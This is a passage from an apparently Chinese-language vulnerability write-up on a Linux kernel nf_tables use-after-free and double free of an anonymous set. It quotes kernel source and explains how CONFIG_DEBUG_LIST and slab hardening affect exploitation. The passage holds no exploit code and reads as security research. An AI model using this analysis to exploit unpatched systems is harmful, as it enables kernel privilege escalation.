class="number">0</span>;</span><br><span class="line">iter.fn= nf_tables_bind_check_setelem;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_bind_check(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iter.err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br><span class="line">bind:</span><br><span class="line">binding-&gt;chain = ctx-&gt;chain;</span><br><span class="line">list_add_tail_rcu(&amp;binding-&gt;<span class="built_in">list</span>, &amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">nft_set_trans_bind(ctx, <span class="built_in">set</span>);</span><br><span class="line"><span class="built_in">set</span>-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nf_tables_bind_set);</span><br></pre></td></tr></table></figure><p>这里就是简单的set绑定到expr上，并且在最后对set的use成员加一。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">err_destroy_flow_rule:</span><br><span class="line"><span class="keyword">if</span> (flow)</span><br><span class="line">nft_flow_rule_destroy(flow);</span><br><span class="line">err_release_rule:</span><br><span class="line">nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err_release_expr:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops) &#123;</span><br><span class="line">module_put(expr_info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info[i].ops-&gt;type-&gt;release_ops(expr_info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(expr_info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞又发生在<code>nf_tables_newrule</code>内，在<code>nf_tables_rule_release</code>函数内部。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_rule_release</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_rule *rule)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nft_rule_expr_deactivate(ctx, rule, NFT_TRANS_RELEASE);</span><br><span class="line">nf_tables_rule_destroy(ctx, rule);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看较为熟悉的<code>nft_rule_expr_deactivate</code>函数，这个函数的主要作用就是调用expr对应的<code>deactivate</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_lookup_deactivate</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">enum</span> nft_trans_phase phase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">nf_tables_deactivate_set(ctx, priv-&gt;<span class="built_in">set</span>, &amp;priv-&gt;binding, phase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数内部直接调用了<code>nf_tables_deactivate_set</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_deactivate_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct nft_set_binding *binding,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">enum</span> nft_trans_phase phase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (phase) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_TRANS_PREPARE:</span><br><span class="line"><span class="built_in">set</span>-&gt;use--;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_TRANS_ABORT:</span><br><span class="line"><span class="keyword">case</span> NFT_TRANS_RELEASE:</span><br><span class="line"><span class="built_in">set</span>-&gt;use--;</span><br><span class="line">fallthrough;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">nf_tables_unbind_set(ctx, <span class="built_in">set</span>, binding,</span><br><span class="line">     phase == NFT_TRANS_COMMIT);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nf_tables_deactivate_set);</span><br></pre></td></tr></table></figure><p>在这个函数中会根据不同的标志位进入到不同分支，这里的漏洞就是因为给了错误的标志位所引起的，这里的标志位为<code>NFT_TRANS_RELEASE</code>，这会直接对set的use成员进行减一操作随后进入到<code>nf_tables_unbind_set</code>函数内部。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_unbind_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct nft_set_binding *binding, <span class="keyword">bool</span> event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">list_del_rcu(&amp;binding-&gt;<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>)) &#123;</span><br><span class="line">list_del_rcu(&amp;<span class="built_in">set</span>-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">if</span> (event)</span><br><span class="line">nf_tables_set_notify(ctx, <span class="built_in">set</span>, NFT_MSG_DELSET,</span><br><span class="line">     GFP_KERNEL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数首先对binding解绑，然后判断set的bindings是否为空，如果为空并且该集合为匿名集合那么就会对该集合的list进行脱链（也就是从table中取出）。</p><p>回到前面的init函数，其中是通过<code>nft_set_lookup_global</code>函数找到对应的集合的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_set *<span class="title">nft_set_lookup_byid</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_table *table,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr *nla, u8 genmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line">u32 id = ntohl(nla_get_be32(nla));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(trans, &amp;nft_net-&gt;commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (trans-&gt;msg_type == NFT_MSG_NEWSET) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span> =</span> nft_trans_set(trans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (id == nft_trans_set_id(trans) &amp;&amp;</span><br><span class="line">    <span class="built_in">set</span>-&gt;table == table &amp;&amp;</span><br><span class="line">    nft_active_genmask(<span class="built_in">set</span>, genmask))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct nft_set *<span class="title">nft_set_lookup_global</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_table *table,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *nla_set_name,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *nla_set_id,</span></span></span><br><span class="line"><span class="params"><span class="function">      u8 genmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla_set_name, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_set_id)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_byid(net, table, nla_set_id, genmask);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_set_lookup_global);</span><br></pre></td></tr></table></figure><p>从上述可以看到，如果我们通过名字找失败的话就会直接通过id去找，并且这里通过id去找事在trans中去寻找最后关于table的校验也只是从set中的table成员拿来对比，所以他也是能够被继续拿到的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_rule_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_rule *rule)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>, *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Careful: some expressions might not be initialized in case this</span></span><br><span class="line"><span class="comment"> * is called on error from nf_tables_newrule().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">while</span> (nft_expr_more(rule, expr)) &#123;</span><br><span class="line">next = nft_expr_next(expr);</span><br><span class="line">nf_tables_expr_destroy(ctx, expr);</span><br><span class="line">expr = next;</span><br><span class="line">&#125;</span><br><span class="line">kfree(rule);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>nf_tables_rule_release</code>函数，后续会接着调用<code>nf_tables_rule_destroy</code>函数，这个函数还是比较眼熟，又回调用<code>expr-&gt;ops-&gt;destroy</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_lookup_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">nf_tables_destroy_set(ctx, priv-&gt;<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_set_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(<span class="built_in">set</span>-&gt;use &gt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">set</span>-&gt;num_exprs; i++)</span><br><span class="line">nft_expr_destroy(ctx, <span class="built_in">set</span>-&gt;exprs[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;destroy(<span class="built_in">set</span>);</span><br><span class="line">nft_set_catchall_destroy(ctx, <span class="built_in">set</span>);</span><br><span class="line">kfree(<span class="built_in">set</span>-&gt;name);</span><br><span class="line">kvfree(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_destroy_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line">nft_set_destroy(ctx, <span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nf_tables_destroy_set);</span><br></pre></td></tr></table></figure><p>这里会首先验证set的bindings是否为空，随后检测是否是匿名集合。在进入<code>nft_set_destroy</code>后回西安判断use成员是否为0，最终直接free掉set和<code>set-&gt;name</code>。</p><p>所以这里存在明显的UAF，不过利用起来稍显麻烦，这里简单介绍一下。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实也不是利用起来麻烦，主要是了解为什么可以这样用这样很麻烦。</p><h4 id="CONFIG-KMALLOC-SPLIT-VARSIZE"><a href="#CONFIG-KMALLOC-SPLIT-VARSIZE" class="headerlink" title="CONFIG_KMALLOC_SPLIT_VARSIZE"></a><strong>CONFIG_KMALLOC_SPLIT_VARSIZE</strong></h4><p>首先是<code>CONFIG_KMALLOC_SPLIT_VARSIZE</code>标志位，该标志位会将可变大小的对象从<code>dyn-kmalloc-cg-xx</code>中申请，但是在原作者的利用过程中利用的全是可变大小的结构体，并且可变大小的结构体挺多的。</p><h4 id="CONFIG-DEBUG-LIST"><a href="#CONFIG-DEBUG-LIST" class="headerlink" title="CONFIG_DEBUG_LIST"></a><strong>CONFIG_DEBUG_LIST</strong></h4><p>再就是这次利用最为核心的标志位<code>CONFIG_DEBUG_LIST</code>，因为可见的是在前面如果想要完成Double Free那么第二次free的时候会再一次对set进行脱链操作，而没有该标志位系统会直接<code>kernel panic</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_rcu</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是删除链的操作，主要逻辑还是在<code>__list_del_entry</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del_entry(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_del_entry_valid(entry))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">__list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里关注<code>__list_del_entry_valid</code>函数，其主要用于检测是否合法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_LIST</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">bool</span> __list_add_valid(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">      struct list_head *prev,</span><br><span class="line">      struct list_head *next);</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">bool</span> __list_del_entry_valid(struct list_head *entry);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> __list_add_valid(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">struct list_head *prev,</span><br><span class="line">struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> __list_del_entry_valid(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>该函数定义由是否存在该标志位决定，如果存在那么就是外部引用的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __list_del_entry_valid(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">prev = entry-&gt;prev;</span><br><span class="line">next = entry-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_DATA_CORRUPTION(next == <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">&quot;list_del corruption, %px-&gt;next is NULL\n&quot;</span>, entry) ||</span><br><span class="line">    CHECK_DATA_CORRUPTION(prev == <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">&quot;list_del corruption, %px-&gt;prev is NULL\n&quot;</span>, entry) ||</span><br><span class="line">    CHECK_DATA_CORRUPTION(next == LIST_POISON1,</span><br><span class="line"><span class="string">&quot;list_del corruption, %px-&gt;next is LIST_POISON1 (%px)\n&quot;</span>,</span><br><span class="line">entry, LIST_POISON1) ||</span><br><span class="line">    CHECK_DATA_CORRUPTION(prev == LIST_POISON2,</span><br><span class="line"><span class="string">&quot;list_del corruption, %px-&gt;prev is LIST_POISON2 (%px)\n&quot;</span>,</span><br><span class="line">entry, LIST_POISON2) ||</span><br><span class="line">    CHECK_DATA_CORRUPTION(prev-&gt;next != entry,</span><br><span class="line"><span class="string">&quot;list_del corruption. prev-&gt;next should be %px, but was %px. (prev=%px)\n&quot;</span>,</span><br><span class="line">entry, prev-&gt;next, prev) ||</span><br><span class="line">    CHECK_DATA_CORRUPTION(next-&gt;prev != entry,</span><br><span class="line"><span class="string">&quot;list_del corruption. next-&gt;prev should be %px, but was %px. (next=%px)\n&quot;</span>,</span><br><span class="line">entry, next-&gt;prev, next))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__list_del_entry_valid);</span><br></pre></td></tr></table></figure><p>因为在第一次脱链结束后，<code>entry-&gt;prev</code>就被赋值为<code>LIST_POISON2</code>了，所以这里会直接返回flase，从而不会进行地址操作也就不会出现kernel panic。</p><h4 id="CONFIG-SLAB-FREELIST-HARDENED"><a href="#CONFIG-SLAB-FREELIST-HARDENED" class="headerlink" title="CONFIG_SLAB_FREELIST_HARDENED"></a><strong>CONFIG_SLAB_FREELIST_HARDENED</strong></h4><p>这里有点怪的是，在原作者文档中给出了<code>freelist_ptr_decode</code>函数的定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr_decode</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">freeptr_t</span> ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">void</span> *decoded;</span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> maybe let slab_to_virt load a virtual address from</span></span><br><span class="line"><span class="comment"> * struct slab instead of using arithmetic for the translation?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> slab_base = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)slab_to_virt(slab);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment"> * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment"> * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment"> * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment"> * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment"> * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment"> * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment"> * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">decoded = (<span class="keyword">void</span> *)(ptr.v ^ s-&gt;random ^</span><br><span class="line">swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This verifies that the SLUB freepointer does not point outside the</span></span><br><span class="line"><span class="comment"> * slab. Since at that point we can basically do it for free, it also</span></span><br><span class="line"><span class="comment"> * checks that the pointer alignment looks vaguely sane.</span></span><br><span class="line"><span class="comment"> * However, we probably don&#x27;t want the cost of a proper division here,</span></span><br><span class="line"><span class="comment"> * so instead we just do a cheap check whether the bottom bits that are</span></span><br><span class="line"><span class="comment"> * clear in the size are also clear in the pointer.</span></span><br><span class="line"><span class="comment"> * So for kmalloc-32, it does a perfect alignment check, but for</span></span><br><span class="line"><span class="comment"> * kmalloc-192, it just checks that the pointer is a multiple of 32.</span></span><br><span class="line"><span class="comment"> * This should probably be reconsidered - is this a good tradeoff, or</span></span><br><span class="line"><span class="comment"> * should that part be thrown out, or do we want a proper accurate</span></span><br><span class="line"><span 